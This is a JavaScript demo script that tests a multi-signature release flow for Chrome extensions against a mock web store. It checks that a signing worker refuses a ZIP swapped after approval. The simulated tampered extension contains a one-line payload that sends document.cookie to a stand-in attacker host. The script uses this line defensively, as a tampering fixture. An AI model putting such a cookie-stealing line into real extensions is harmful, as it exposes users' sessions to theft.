// Chrome Web Store flow, offline: the real contract (run natively), the real
// worker binary, and a mock Chrome Web Store that checks the CRX3 signature.
//
//   node cli/scripts/demo-chrome.mjs
//
// Needs: the worker built (npm run build:worker).

import { existsSync } from 'node:fs';
import { createHash, generateKeyPairSync } from 'node:crypto';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { LocalNet } from '../src/localchain.mjs';
import * as cmd from '../src/commands.mjs';
import { startChromeStore } from '../../mock/chromestore.mjs';
import { makeExtension } from '../../mock/zip.mjs';
import { sha256 } from '../src/util.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const workerBin = path.join(root, 'worker/target/debug/keyturn-worker' + (process.platform === 'win32' ? '.exe' : ''));
if (!existsSync(workerBin)) throw new Error('build the worker first: npm run build:worker');

// The developer key lives only in the worker. Its id is the extension id.
const { privateKey, publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
const extensionId = [...createHash('sha256').update(publicKey.export({ type: 'spki', format: 'der' })).digest().subarray(0, 16)]
  .map((b) => String.fromCharCode(97 + (b >> 4)) + String.fromCharCode(97 + (b & 15)))
  .join('');

const net = new LocalNet({ worker: 'worker.local' });
const A = { ada: net.as('ada.local'), bob: net.as('bob.local'), cy: net.as('cy.local'), ci: net.as('ci.local'), worker: net.as('worker.local'), watch: net.as('watch.local') };
const REFRESH = 'demo-refresh-token';
const store = await startChromeStore({ refreshToken: REFRESH });
const runWorker = cmd.runWorkerBinary(workerBin, {
  CWS_CLIENT_ID: 'demo-client',
  CWS_CLIENT_SECRET: 'demo-secret',
  CWS_REFRESH_TOKEN: REFRESH,
  CWS_PUBLISHER_ID: store.publisher,
  CRX_PRIVATE_KEY: privateKey.export({ type: 'pkcs8', format: 'pem' }),
  KEYTURN_CWS_API: store.url,
  KEYTURN_OAUTH_URL: store.url,
  KEYTURN_ALLOW_HTTP: '1',
});

const project = `chrome:${extensionId}`;
const HOUR = 3_600_000;
let failures = 0;
const step = (t) => console.log(`\n== ${t}`);
const say = (t) => console.log(`   ${t}`);
function check(ok, text) {
  console.log(`   ${ok ? 'PASS' : 'FAIL'}  ${text}`);
  if (!ok) failures++;
}
const statusOf = async (v) => (await A.ada.view('get_release', { project_id: project, version: v }))?.status;

async function buildAndPropose(version, source) {
  const zip = makeExtension(version, source);
  const r = await fetch(`${store.url}/-/mock/artifact`, { method: 'POST', body: JSON.stringify({ zip: zip.toString('base64') }) });
  const { id, url } = await r.json();
  await A.ci.call('propose_release', { project_id: project, version, artifact_hash: sha256(zip) });
  say(`CI built ${version}, uploaded the ZIP and proposed hash ${sha256(zip).slice(0, 16)}...`);
  return { id, url, zip };
}

try {
  console.log(`extension ${extensionId}\nsigning key held by the worker only; CI has no key and no store credentials`);

  step('1. Register the extension: 3 maintainers, 2 must approve');
  await cmd.register(A.ada, { project, registry: 'chrome', members: 'ada.local,bob.local,cy.local', proposers: 'ci.local', threshold: 2, windowHours: 1 });
  say('registered');

  step('2. Approve, wait out the public window, execute');
  const v1 = await buildAndPropose('1.0.0', 'console.log("v1");\n');
  await cmd.approve(A.ada, { project, version: '1.0.0' });
  await cmd.approve(A.bob, { project, version: '1.0.0' });
  net.advance(HOUR + 1000);
  await cmd.execute(A.watch, { project, version: '1.0.0' });
  check((await statusOf('1.0.0')) === 'Executing', 'release is Executing');

  step('3. The worker signs the approved ZIP and uploads it to the store');
  const r1 = await cmd.relay(A.worker, { project, version: '1.0.0', artifactUrl: v1.url, runWorker });
  check(r1.confirmed && (await statusOf('1.0.0')) === 'Released', 'store accepted a CRX signed by the worker key: Released');
  check(store.isPending(extensionId) && store.pendingVersion(extensionId) === '1.0.0', 'the store holds version 1.0.0 for review');

  step('4. Consumers verify the live extension');
  const early = await cmd.verify(A.ada, { project, version: '1.0.0', registryUrl: store.url });
  check(!early.ok, `before review finishes, verify fails: ${early.reason}`);
  await fetch(`${store.url}/-/mock/go-live/${extensionId}`, { method: 'POST' });
  const live = await cmd.verify(A.ada, { project, version: '1.0.0', registryUrl: store.url });
  check(live.ok, `after review, verify passes on the ZIP inside the live CRX: ${live.reason}`);

  step('5. The ZIP is swapped after approval; the worker refuses to sign it');
  const v2 = await buildAndPropose('1.0.1', 'console.log("v2");\n');
  await cmd.approve(A.ada, { project, version: '1.0.1' });
  await cmd.approve(A.cy, { project, version: '1.0.1' });
  net.advance(HOUR + 1000);
  await cmd.execute(A.watch, { project, version: '1.0.1' });
  const evil = makeExtension('1.0.1', 'fetch("https://evil.test/steal?c=" + document.cookie);\n');
  await fetch(`${store.url}/-/mock/tamper-artifact/${v2.id}`, { method: 'POST', body: JSON.stringify({ zip: evil.toString('base64') }) });
  say('the attacker replaced the uploaded ZIP after approval');
  const r2 = await cmd.relay(A.worker, { project, version: '1.0.1', artifactUrl: v2.url, runWorker });
  check(!r2.confirmed && r2.result.error === 'hash_mismatch', `worker refused: ${r2.result.error}`);
  check(store.pendingVersion(extensionId) === '1.0.0', 'the store still holds 1.0.0 only');
  check((await statusOf('1.0.1')) === 'Executing', 'the contract never recorded a publication');
} finally {
  await store.close();
  net.close();
}

console.log(failures === 0 ? '\nALL CHECKS PASSED' : `\n${failures} CHECK(S) FAILED`);
process.exitCode = failures === 0 ? 0 : 1;
